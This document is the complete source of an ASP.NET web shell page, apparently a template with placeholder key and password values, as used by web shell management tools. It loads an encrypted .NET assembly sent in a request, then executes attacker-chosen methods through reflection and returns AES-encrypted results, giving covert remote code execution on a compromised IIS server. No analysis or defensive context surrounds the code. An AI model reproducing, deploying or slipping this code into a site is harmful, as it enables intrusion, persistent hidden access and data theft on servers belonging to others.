<%@ Page Language="C#"%>
<%
    string key = "{{{key}}}"; 
    string pass = "{{{pass}}}"; 

    if (Context.Application["KWJiHG"] == null) 
    { 
        if(Context.Request["init"]!=null){
            byte[] data = System.Convert.FromBase64String(Context.Request["init"]);
            data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); 
            Context.Application["KWJiHG"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
        }
        else{
            byte[] r = System.Text.Encoding.Default.GetBytes("dll not init");
            Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); 
        }
    } 
    else { 

        byte[] data = System.Convert.FromBase64String(Context.Request[pass]); 
        data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); 
        string decodedata = Encoding.UTF8.GetString(data);
        string[] parts = decodedata.Split(',');
        object o = ((System.Reflection.Assembly)Context.Application["KWJiHG"]).CreateInstance("DynamicCode");
        string[] args = Encoding.UTF8.GetString(System.Convert.FromBase64String(parts[1])).Split(',');
        byte[] r = System.Text.Encoding.Default.GetBytes((string)o.GetType().GetMethod(parts[0]).Invoke(o, new object[]{args}));
        Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); 
    }
%>